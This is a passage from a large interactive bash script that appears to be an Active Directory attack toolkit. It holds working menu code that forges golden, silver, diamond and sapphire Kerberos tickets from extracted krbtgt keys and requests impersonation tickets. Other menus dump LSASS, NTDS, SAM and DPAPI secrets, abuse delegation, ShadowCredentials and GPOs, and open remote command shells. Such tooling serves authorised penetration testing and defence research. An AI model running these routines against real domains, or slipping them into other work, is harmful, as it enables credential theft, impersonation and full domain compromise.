\"./${tick_randuser}.ccache\" \"./${tick_randuser}_golden.ccache\" 2>/dev/null\n                /bin/mv \"./${tick_randuser}.kirbi\" \"./${tick_randuser}_golden.kirbi\" 2>/dev/null\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${tick_randuser}_golden.ccache\" ]; then\n                    echo -e \"${GREEN}[+] Golden ticket generated successfully:${NC}\"\n                    echo -e \"${output_dir}/Credentials/${tick_randuser}_golden.ccache\"\n                    echo -e \"${output_dir}/Credentials/${tick_randuser}_golden.kirbi\"\n                else\n                    echo -e \"${RED}[-] Failed to generate golden ticket${NC}\"\n                fi\n            fi\n        fi\n        kerberos_menu\n        ;;\n\n    12)\n        if [ ! -f \"${impacket_ticketer}\" ]; then\n            echo -e \"${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}\"\n        else\n            tick_randuser=\"Administrator\"\n            tick_randuserid=\"\"\n            tick_spn=\"CIFS/${dc_domain}\"\n            tick_groups=\"\"\n            tick_servuser=\"\"\n\n            echo -e \"${BLUE}[*] Please specify name of SPN account (Example: 'sql_svc'):${NC}\"\n            read -rp \">> \" tick_servuser </dev/tty\n            while [[ \"${tick_servuser}\" == \"\" ]]; do\n                echo -e \"${RED}Invalid username.${NC} Please specify another:\"\n                read -rp \">> \" tick_servuser </dev/tty\n            done\n\n            echo -e \"${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}\"\n            read -rp \">> \" rc4_or_aes </dev/tty\n            while [ \"${rc4_or_aes}\" != \"RC4\" ] && [ \"${rc4_or_aes}\" != \"AES\" ]; do\n                echo -e \"${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':\"\n                read -rp \">> \" rc4_or_aes </dev/tty\n            done\n            gethash_hash=\"\"\n            echo -e \"${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}\"\n            read -rp \">> \" gethash_hash </dev/tty\n            if [[ ${gethash_hash} == \"\" ]]; then\n                gethash_user=$tick_servuser\n                get_hash\n            else\n                if [[ ${rc4_or_aes} == \"RC4\" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi\n            fi\n\n            if [[ ${gethash_nt} == \"\" ]] && [[ ${gethash_aes} == \"\" ]]; then\n                echo -e \"${RED}[-] Failed to extract hash of ${gethash_user}${NC}\"\n            else\n                if [[ ${rc4_or_aes} == \"RC4\" ]]; then gethash_key=\"-nthash ${gethash_nt}\"; else gethash_key=\"-aesKey ${gethash_aes}\"; fi\n\n                echo -e \"${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):${NC}\"\n                read -rp \">> \" tick_randuser_value </dev/tty\n                if [[ ! \"${tick_randuser_value}\" == \"\" ]]; then tick_randuser=\"${tick_randuser_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify the chosen user's ID (press Enter to choose default value EMPTY):${NC}\"\n                read -rp \">> \" tick_randuserid_value </dev/tty\n                if [[ ! \"${tick_randuserid_value}\" == \"\" ]]; then tick_randuserid=\"-user-id ${tick_randuserid_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):${NC}\"\n                read -rp \">> \" tick_spn_value </dev/tty\n                if [[ ! \"${tick_spn_value}\" == \"\" ]]; then tick_spn=\"${tick_spn_value}\"; fi\n                get_domain_sid\n                while [[ \"${sid_domain}\" == \"\" ]]; do\n                    echo -e \"${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}\"\n                    echo -e \"${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}\"\n                    read -rp \">> \" sid_domain </dev/tty\n                done\n                echo -e \"${CYAN}[*] Generating silver ticket for service ${tick_spn}...${NC}\"\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuserid} ${tick_randuser}\"\n                ticket_ccache_out=\"${tick_randuser}_silver_$(echo \"${tick_spn}\" | sed 's/\\//_/g').ccache\"\n                ticket_kirbi_out=\"${tick_randuser}_silver_$(echo \"${tick_spn}\" | sed 's/\\//_/g').kirbi\"\n                run_command \"${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi\"\n                /bin/mv \"./${tick_randuser}.ccache\" \"./${ticket_ccache_out}\" 2>/dev/null\n                /bin/mv \"./${tick_randuser}.kirbi\" \"./${ticket_kirbi_out}\" 2>/dev/null\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${ticket_ccache_out}\" ]; then\n                    echo -e \"${GREEN}[+] Silver ticket generated successfully:${NC}\"\n                    echo -e \"${output_dir}/Credentials/${ticket_ccache_out}\"\n                    echo -e \"${output_dir}/Credentials/${ticket_kirbi_out}\"\n                else\n                    echo -e \"${RED}[-] Failed to generate silver ticket${NC}\"\n                fi\n            fi\n        fi\n        kerberos_menu\n        ;;\n\n    13)\n        if [ ! -f \"${impacket_getST}\" ]; then\n            echo -e \"${RED}[-] getST.py not found! Please verify the installation of impacket${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${RED}[-] Requesting ticket using getST requires credentials${NC}\"\n            else\n                tick_randuser=\"Administrator\"\n                tick_spn=\"CIFS/${dc_domain}\"\n\n                echo -e \"${BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):${NC}\"\n                read -rp \">> \" tick_randuser_value </dev/tty\n                if [[ ! ${tick_randuser_value} == \"\" ]]; then tick_randuser=\"${tick_randuser_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):${NC}\"\n                read -rp \">> \" tick_spn_value </dev/tty\n                if [[ ! ${tick_spn_value} == \"\" ]]; then tick_spn=\"${tick_spn_value}\"; fi\n                echo -e \"${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}\"\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${impacket_getST} ${argument_imp} -self -impersonate ${tick_randuser} -dc-ip ${dc_ip} -altservice ${tick_spn}\" | tee -a \"${output_dir}/Credentials/getST_output_${dc_domain}\"\n                ticket_ccache_out=\"${tick_randuser}@$(echo \"${tick_spn}\" | sed 's/\\//_/g')@${dc_domain^^}.ccache\"\n                ticket_kirbi_out=\"${tick_randuser}@$(echo \"${tick_spn}\" | sed 's/\\//_/g')@${dc_domain^^}.kirbi\"\n                run_command \"${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}\"\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${ticket_ccache_out}\" ]; then\n                    echo -e \"${GREEN}[+] TGS for SPN ${tick_spn} impersonating ${tick_randuser} generated successfully:${NC} $krb_ticket\"\n                    echo -e \"${output_dir}/Credentials/${ticket_ccache_out}\"\n                    echo -e \"${output_dir}/Credentials/${ticket_kirbi_out}\"\n                else\n                    echo -e \"${RED}[-] Failed to request ticket${NC}\"\n                fi\n            fi\n        fi\n        kerberos_menu\n        ;;\n\n    14)\n        if [ ! -f \"${impacket_ticketer}\" ]; then\n            echo -e \"${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}\"\n        else\n            echo -e \"${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}\"\n            read -rp \">> \" rc4_or_aes </dev/tty\n            while [ \"${rc4_or_aes}\" != \"RC4\" ] && [ \"${rc4_or_aes}\" != \"AES\" ]; do\n                echo -e \"${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':${NC}\"\n                read -rp \">> \" rc4_or_aes </dev/tty\n            done\n            gethash_user=\"krbtgt\"\n            gethash_hash=\"\"\n            echo -e \"${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}\"\n            read -rp \">> \" gethash_hash </dev/tty\n            if [[ ${gethash_hash} == \"\" ]]; then\n                get_hash\n            else\n                if [[ ${rc4_or_aes} == \"RC4\" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi\n            fi\n\n            if [[ ${gethash_nt} == \"\" ]] && [[ ${gethash_aes} == \"\" ]]; then\n                echo -e \"${RED}[-] Failed to extract hash of ${gethash_user}${NC}\"\n            else\n                gethash_key=\"-nthash ${gethash_nt} -aesKey ${gethash_aes}\"\n                tick_randuser=\"sql_svc\"\n                tick_user_id=\"1337\"\n                tick_groups=\"512,513,518,519,520\"\n                echo -e \"${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):${NC}\"\n                read -rp \">> \" tick_randuser_value </dev/tty\n                if [[ ! \"${tick_randuser_value}\" == \"\" ]]; then tick_randuser=\"${tick_randuser_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):${NC}\"\n                read -rp \">> \" tick_user_id_value </dev/tty\n                if [[ ! \"${tick_user_id_value}\" == \"\" ]]; then tick_user_id=\"${tick_user_id_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):${NC}\"\n                read -rp \">> \" tick_group_ids_value </dev/tty\n                if [[ ! \"${tick_group_ids_value}\" == \"\" ]]; then tick_groups=\"${tick_group_ids_value}\"; fi\n                get_domain_sid\n                while [[ \"${sid_domain}\" == \"\" ]]; do\n                    echo -e \"${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}\"\n                    read -rp \">> \" sid_domain </dev/tty\n                done\n                echo -e \"${CYAN}[*] Generating diamond ticket...${NC}\"\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}\"\n                /bin/mv \"./${tick_randuser}.ccache\" \"./${tick_randuser}_diamond.ccache\" 2>/dev/null\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${tick_randuser}_diamond.ccache\" ]; then\n                    echo -e \"${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache\"\n                else\n                    echo -e \"${RED}[-] Failed to generate diamond ticket${NC}\"\n                fi\n            fi\n        fi\n        kerberos_menu\n        ;;\n\n    15)\n        if [ ! -f \"${impacket_ticketer}\" ]; then\n            echo -e \"${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}\"\n        else\n            echo -e \"${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}\"\n            read -rp \">> \" rc4_or_aes </dev/tty\n            while [ \"${rc4_or_aes}\" != \"RC4\" ] && [ \"${rc4_or_aes}\" != \"AES\" ]; do\n                echo -e \"${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':\"\n                read -rp \">> \" rc4_or_aes </dev/tty\n            done\n            gethash_user=\"krbtgt\"\n            gethash_hash=\"\"\n            echo -e \"${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}\"\n            read -rp \">> \" gethash_hash </dev/tty\n            if [[ ${gethash_hash} == \"\" ]]; then\n                get_hash\n            else\n                if [[ ${rc4_or_aes} == \"RC4\" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi\n            fi\n\n            if [[ ${gethash_nt} == \"\" ]] && [[ ${gethash_aes} == \"\" ]]; then\n                echo -e \"${RED}[-] Failed to extract hash of ${gethash_user}${NC}\"\n            else\n                gethash_key=\"-nthash ${gethash_nt} -aesKey ${gethash_aes}\"\n                tick_randuser=\"sql_svc\"\n                tick_user_id=\"1337\"\n                tick_groups=\"512,513,518,519,520\"\n                tick_domain_admin=\"${user}\"\n                echo -e \"${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):${NC}\"\n                read -rp \">> \" tick_randuser_value </dev/tty\n                if [[ ! ${tick_randuser_value} == \"\" ]]; then tick_randuser=\"${tick_randuser_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):${NC}\"\n                read -rp \">> \" tick_user_id_value </dev/tty\n                if [[ ! ${tick_user_id_value} == \"\" ]]; then tick_user_id=\"${tick_user_id_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):${NC}\"\n                read -rp \">> \" tick_group_ids_value </dev/tty\n                if [[ ! ${tick_group_ids_value} == \"\" ]]; then tick_groups=\"${tick_group_ids_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify domain admin to impersonate (press Enter to choose default value current user):${NC}\"\n                read -rp \">> \" tick_domain_admin_value </dev/tty\n                if [[ ! ${tick_domain_admin_value} == \"\" ]]; then tick_domain_admin=\"${tick_domain_admin_value}\"; fi\n                get_domain_sid\n                while [[ \"${sid_domain}\" == \"\" ]]; do\n                    echo -e \"${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}\"\n                    read -rp \">> \" sid_domain </dev/tty\n                done\n                echo -e \"${CYAN}[*] Generating sapphire ticket...${NC}\"\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}\"\n                /bin/mv \"./${tick_randuser}.ccache\" \"./${tick_randuser}_sapphire.ccache\" 2>/dev/null\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${tick_randuser}_sapphire.ccache\" ]; then\n                    echo -e \"${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache\"\n                else\n                    echo -e \"${RED}[-] Failed to generate sapphire ticket${NC}\"\n                fi\n            fi\n        fi\n        kerberos_menu\n        ;;\n\n    16)\n        raise_child\n        kerberos_menu\n        ;;\n\n    17)\n        if [ ! -f \"${impacket_getST}\" ]; then\n            echo -e \"${RED}[-] getST.py not found! Please verify the installation of impacket${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${RED}[-] Requesting ticket using getST requires credentials${NC}\"\n            else\n                tick_randuser=\"Administrator\"\n                tick_spn=\"CIFS/${dc_domain}\"\n\n                echo -e \"${BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):${NC}\"\n                read -rp \">> \" tick_randuser_value </dev/tty\n                if [[ ! ${tick_randuser_value} == \"\" ]]; then tick_randuser=\"${tick_randuser_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):${NC}\"\n                read -rp \">> \" tick_spn_value </dev/tty\n                if [[ ! ${tick_spn_value} == \"\" ]]; then tick_spn=\"${tick_spn_value}\"; fi\n                echo -e \"${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}\"\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser}\"\n                ticket_ccache_out=\"${tick_randuser}@$(echo \"${tick_spn}\" | sed 's/\\//_/g')@${dc_domain^^}.ccache\"\n                ticket_kirbi_out=\"${tick_randuser}@$(echo \"${tick_spn}\" | sed 's/\\//_/g')@${dc_domain^^}.kirbi\"\n                run_command \"${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}\"\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${ticket_ccache_out}\" ]; then\n                    echo -e \"${GREEN}[+] Delegated ticket successfully requested :${NC}\"\n                    echo -e \"${output_dir}/Credentials/${ticket_ccache_out}\"\n                    echo -e \"${output_dir}/Credentials/${ticket_kirbi_out}\"\n                else\n                    echo -e \"${RED}[-] Failed to request ticket${NC}\"\n                fi\n            fi\n        fi\n        kerberos_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        kerberos_menu\n        ;;\n    esac\n}\n\nshares_menu() {\n    mkdir -p \"${output_dir}/Shares\"\n    echo -e \"\"\n    echo -e \"${CYAN}[SMB Shares menu]${NC} Please choose from the following options:\"\n    echo -e \"-----------------------------------------------------------\"\n    echo -e \"${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}\"\n    echo -e \"A) SMB SHARES SCANS #1-2-3-4\"\n    echo -e \"m) Modify target(s)\"\n    echo -e \"1) SMB shares Scan using smbmap\"\n    echo -e \"2) SMB shares Enumeration using netexec\"\n    echo -e \"3) SMB shares Spidering using netexec \"\n    echo -e \"4) SMB shares Scan using FindUncommonShares\"\n    echo -e \"5) SMB shares Scan using manspider\"\n    echo -e \"6) Open smbclient.py console on target\"\n    echo -e \"7) Open p0dalirius's smbclientng console on target\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        scan_shares\n        shares_menu\n        ;;\n\n    m)\n        modify_target\n        shares_menu\n        ;;\n\n    1)\n        smb_map\n        shares_menu\n        ;;\n\n    2)\n        ne_shares\n        shares_menu\n        ;;\n\n    3)\n        ne_spider\n        shares_menu\n        ;;\n\n    4)\n        finduncshar_scan\n        shares_menu\n        ;;\n\n    5)\n        manspider_scan\n        shares_menu\n        ;;\n\n    6)\n        smbclient_console\n        shares_menu\n        ;;\n\n    7)\n        smbclientng_console\n        shares_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        shares_menu\n        ;;\n    esac\n\n}\n\nvulns_menu() {\n    mkdir -p \"${output_dir}/Vulnerabilities\"\n    echo -e \"\"\n    echo -e \"${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:\"\n    echo -e \"------------------------------------------------------------\"\n    echo -e \"${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}\"\n    echo -e \"A) VULNERABILITY CHECKS #1-2-3-4-5-6-7-8-9-10-11-12-15\"\n    echo -e \"m) Modify target(s)\"\n    echo -e \"1) zerologon check using netexec (only on DC)\"\n    echo -e \"2) MS17-010 check using netexec\"\n    echo -e \"3) Print Spooler check using netexec\"\n    echo -e \"4) Printnightmare check using netexec\"\n    echo -e \"5) WebDAV check using netexec\"\n    echo -e \"6) coerce check using netexec\"\n    echo -e \"7) SMB signing check using netexec\"\n    echo -e \"8) ntlmv1 check using netexec\"\n    echo -e \"9) runasppl check using netexec\"\n    echo -e \"10) smbghost check using netexec\"\n    echo -e \"11) RPC Dump and check for interesting protocols\"\n    echo -e \"12) Coercer RPC scan\"\n    echo -e \"13) PushSubscription abuse using PrivExchange\"\n    echo -e \"14) RunFinger scan\"\n    echo -e \"15) Run LDAPNightmare check\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        vuln_checks\n        vulns_menu\n        ;;\n\n    m)\n        modify_target\n        vulns_menu\n        ;;\n\n    1)\n        zerologon_check\n        vulns_menu\n        ;;\n\n    2)\n        ms17-010_check\n        vulns_menu\n        ;;\n\n    3)\n        spooler_check\n        vulns_menu\n        ;;\n\n    4)\n        printnightmare_check\n        vulns_menu\n        ;;\n\n    5)\n        webdav_check\n        vulns_menu\n        ;;\n\n    6)\n        coerceplus_check\n        vulns_menu\n        ;;\n\n    7)\n        smbsigning_check\n        vulns_menu\n        ;;\n\n    8)\n        ntlmv1_check\n        vulns_menu\n        ;;\n\n    9)\n        runasppl_check\n        vulns_menu\n        ;;\n\n    10)\n        smbghost_check\n        vulns_menu\n        ;;\n\n    11)\n        rpcdump_check\n        vulns_menu\n        ;;\n\n    12)\n        coercer_check\n        vulns_menu\n        ;;\n\n    13)\n        privexchange_check\n        vulns_menu\n        ;;\n\n    14)\n        runfinger_check\n        vulns_menu\n        ;;\n\n    15)\n        ldapnightmare_check\n        vulns_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        vulns_menu\n        ;;\n    esac\n}\n\nmssql_menu() {\n    mkdir -p \"${output_dir}/MSSQL\"\n    echo -e \"\"\n    echo -e \"${CYAN}[MSSQL Enumeration menu]${NC} Please choose from the following options:\"\n    echo -e \"------------------------------------------------------------------\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] MSSQL Enumeration requires credentials${NC}\"\n    else\n        echo -e \"A) MSSQL CHECKS #1-2\"\n        echo -e \"1) MSSQL Enumeration using netexec\"\n        echo -e \"2) MSSQL Relay check\"\n        echo -e \"3) Open mssqlclient.py console on target\"\n        echo -e \"4) Open mssqlpwner in interactive mode\"\n    fi\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        mssql_checks\n        mssql_menu\n        ;;\n\n    1)\n        mssql_enum\n        mssql_menu\n        ;;\n\n    2)\n        mssql_relay_check\n        mssql_menu\n        ;;\n\n    3)\n        mssqlclient_console\n        mssql_menu\n        ;;\n\n    4)\n        mssqlpwner_console\n        mssql_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        mssql_menu\n        ;;\n    esac\n}\n\npwd_menu() {\n    mkdir -p \"${output_dir}/Credentials\"\n    echo -e \"\"\n    echo -e \"${CYAN}[Password Dump menu]${NC} Please choose from the following options:\"\n    echo -e \"--------------------------------------------------------------\"\n    echo -e \"${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Password Dump requires credentials${NC}\"\n    else\n        echo -e \"A) PASSWORD DUMPS #1-2-4-12-13-16\"\n        echo -e \"m) Modify target(s)\"\n        echo -e \"1) LAPS Dump using netexec\"\n        echo -e \"2) gMSA Dump using netexec\"\n        echo -e \"3) DCSync using secretsdump (only on DC)\"\n        echo -e \"4) Dump SAM and LSA using secretsdump\"\n        echo -e \"5) Dump SAM and SYSTEM using reg\"\n        echo -e \"6) Dump NTDS using netexec\"\n        echo -e \"7) Dump SAM using netexec\"\n        echo -e \"8) Dump LSA secrets using netexec\"\n        echo -e \"9) Dump LSASS using lsassy\"\n        echo -e \"10) Dump LSASS using handlekatz\"\n        echo -e \"11) Dump LSASS using procdump\"\n        echo -e \"12) Dump LSASS using nanodump\"\n        echo -e \"13) Dump dpapi secrets using netexec\"\n        echo -e \"14) Dump secrets using DonPAPI\"\n        echo -e \"15) Dump secrets using hekatomb (only on DC)\"\n        echo -e \"16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)\"\n        echo -e \"17) Dump Veeam credentials (only from Veeam server)\"\n        echo -e \"18) Dump Msol password (only from Azure AD-Connect server)\"\n        echo -e \"19) Extract Bitlocker Keys\"\n    fi\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        pwd_dump\n        pwd_menu\n        ;;\n\n    m)\n        modify_target\n        pwd_menu\n        ;;\n\n    1)\n        laps_dump\n        pwd_menu\n        ;;\n\n    2)\n        gmsa_dump\n        pwd_menu\n        ;;\n\n    3)\n        secrets_dump_dcsync\n        pwd_menu\n        ;;\n\n    4)\n        secrets_dump\n        pwd_menu\n        ;;\n\n    5)\n        samsystem_dump\n        pwd_menu\n        ;;\n\n    6)\n        ntds_dump\n        pwd_menu\n        ;;\n\n    7)\n        sam_dump\n        pwd_menu\n        ;;\n\n    8)\n        lsa_dump\n        pwd_menu\n        ;;\n\n    9)\n        lsassy_dump\n        pwd_menu\n        ;;\n\n    10)\n        handlekatz_dump\n        pwd_menu\n        ;;\n\n    11)\n        procdump_dump\n        pwd_menu\n        ;;\n\n    12)\n        nanodump_dump\n        pwd_menu\n        ;;\n\n    13)\n        dpapi_dump\n        pwd_menu\n        ;;\n\n    14)\n        donpapi_dump\n        pwd_menu\n        ;;\n\n    15)\n        hekatomb_dump\n        pwd_menu\n        ;;\n\n    16)\n        juicycreds_dump\n        pwd_menu\n        ;;\n\n    17)\n        veeam_dump\n        pwd_menu\n        ;;\n\n    18)\n        msol_dump\n        pwd_menu\n        ;;\n\n    19)\n        bitlocker_dump\n        pwd_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        pwd_menu\n        ;;\n    esac\n}\n\nmodif_menu() {\n    mkdir -p \"${output_dir}/Modification\"\n    echo -e \"\"\n    echo -e \"${CYAN}[Modification menu]${NC} Please choose from the following options:\"\n    echo -e \"-------------------------------------------------------------\"\n    echo -e \"${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}\"\n    echo -e \"m) Modify target(s)\"\n    echo -e \"1) Change user or computer password (Requires: ForceChangePassword on user or computer)\"\n    echo -e \"2) Add user to group (Requires: GenericWrite or GenericAll on group)\"\n    echo -e \"3) Add new computer (Requires: MAQ > 0)\"\n    echo -e \"4) Add new DNS entry\"\n    echo -e \"5) Change Owner of target (Requires: WriteOwner permission)\"\n    echo -e \"6) Add GenericAll rights on target (Requires: Owner permission)\"\n    echo -e \"7) Targeted Kerberoast Attack (Noisy!)\"\n    echo -e \"8) Perform RBCD attack (Requires: GenericWrite or GenericAll or AllowedToAct on computer)\"\n    echo -e \"9) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)\"\n    echo -e \"10) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)\"\n    echo -e \"11) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)\"\n    echo -e \"12) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)\"\n    echo -e \"13) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)\"\n    echo -e \"14) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: GenericWrite or GenericAll on user)\"\n    echo -e \"15) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)\"\n    echo -e \"16) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    1)\n        change_pass\n        modif_menu\n        ;;\n\n    2)\n        add_group_member\n        modif_menu\n        ;;\n\n    3)\n        add_computer\n        modif_menu\n        ;;\n\n    4)\n        dnsentry_add\n        modif_menu\n        ;;\n\n    5)\n        change_owner\n        modif_menu\n        ;;\n\n    6)\n        add_genericall\n        modif_menu\n        ;;\n\n    7)\n        targetedkerberoast_attack\n        modif_menu\n        ;;\n\n    8)\n        rbcd_attack\n        modif_menu\n        ;;\n\n    9)\n        rbcd_spnless_attack\n        modif_menu\n        ;;\n\n    10)\n        shadowcreds_attack\n        modif_menu\n        ;;\n\n    11)\n        pygpo_abuse\n        modif_menu\n        ;;\n\n    12)\n        add_unconstrained\n        modif_menu\n        ;;\n\n    13)\n        add_spn\n        modif_menu\n        ;;\n\n    14)\n        add_upn\n        modif_menu\n        ;;\n\n    15)\n        add_constrained\n        modif_menu\n        ;;\n\n    16)\n        add_spn_constrained\n        modif_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        modif_menu\n        ;;\n    esac\n}\n\ncmdexec_menu() {\n    mkdir -p \"${output_dir}/CommandExec\"\n    echo -e \"\"\n    echo -e \"${CYAN}[Command Execution menu]${NC} Please choose from the following options:\"\n    echo -e \"------------------------------------------------------------------\"\n    echo -e \"1) Open CMD console using smbexec on target\"\n    echo -e \"2) Open CMD console using wmiexec on target\"\n    echo -e \"3) Open CMD console using psexec on target\"\n    echo -e \"4) Open PowerShell console using evil-winrm on target\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    1)\n        smbexec_console\n        cmdexec_menu\n        ;;\n\n    2)\n        wmiexec_console\n        cmdexec_menu\n        ;;\n\n    3)\n        psexec_console\n        cmdexec_menu\n        ;;\n\n    4)\n        evilwinrm_console\n        cmdexec_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        cmdexec_menu\n        ;;\n    esac\n}\n\ninit_menu() {\n    echo -e \"\"\n    echo -e 